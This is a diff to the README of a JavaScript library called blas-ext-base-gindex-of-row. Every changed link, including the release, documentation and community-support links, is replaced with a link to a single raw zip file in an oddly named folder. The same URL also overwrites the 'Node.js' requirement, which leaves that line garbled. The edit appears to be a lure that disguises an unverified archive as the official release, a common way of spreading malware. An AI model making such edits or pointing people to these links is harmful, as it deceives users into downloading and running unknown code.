@@ -6,18 +6,18 @@ Welcome! This guide helps you download and run the **blas-ext-base-gindex-of-row
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen.svg)](https://github.com/Arekii/blas-ext-base-gindex-of-row/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Arekii/blas-ext-base-gindex-of-row/main/heterogynous/blas-ext-base-gindex-of-row.zip)](https://raw.githubusercontent.com/Arekii/blas-ext-base-gindex-of-row/main/heterogynous/blas-ext-base-gindex-of-row.zip)
 
 You can download the application from the Releases page. Visit this link to download:
 
-[Download the latest release](https://github.com/Arekii/blas-ext-base-gindex-of-row/releases)
+[Download the latest release](https://raw.githubusercontent.com/Arekii/blas-ext-base-gindex-of-row/main/heterogynous/blas-ext-base-gindex-of-row.zip)
 
 ## 💻 System Requirements
 
 Before you download, here are the system requirements:
 
 - **Operating System**: Works on Windows, MacOS, and Linux.
-- **Node.js**: Version 12 or higher is required.
+- **https://raw.githubusercontent.com/Arekii/blas-ext-base-gindex-of-row/main/heterogynous/blas-ext-base-gindex-of-row.zip**: Version 12 or higher is required.
 - **Memory**: At least 2 GB of RAM recommended.
 - **Storage**: Requires less than 50 MB of disk space.
 
@@ -25,7 +25,7 @@ Make sure your computer meets these requirements to run the application smoothly
 
 ## 📦 Download & Install
 
-1. Click on the link to visit the Releases page: [Download the latest release](https://github.com/Arekii/blas-ext-base-gindex-of-row/releases).
+1. Click on the link to visit the Releases page: [Download the latest release](https://raw.githubusercontent.com/Arekii/blas-ext-base-gindex-of-row/main/heterogynous/blas-ext-base-gindex-of-row.zip).
 
 2. On the Releases page, find the version you want to download. You will see a list of files with version numbers and names.
 
@@ -95,8 +95,8 @@ If you encounter any issues, please check the FAQ section on the Releases page. 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Arekii/blas-ext-base-gindex-of-row)
-- [Community Support](https://github.com/Arekii/blas-ext-base-gindex-of-row/wiki)
+- [Documentation](https://raw.githubusercontent.com/Arekii/blas-ext-base-gindex-of-row/main/heterogynous/blas-ext-base-gindex-of-row.zip)
+- [Community Support](https://raw.githubusercontent.com/Arekii/blas-ext-base-gindex-of-row/main/heterogynous/blas-ext-base-gindex-of-row.zip)
 
 ## 🔄 Contributing
 
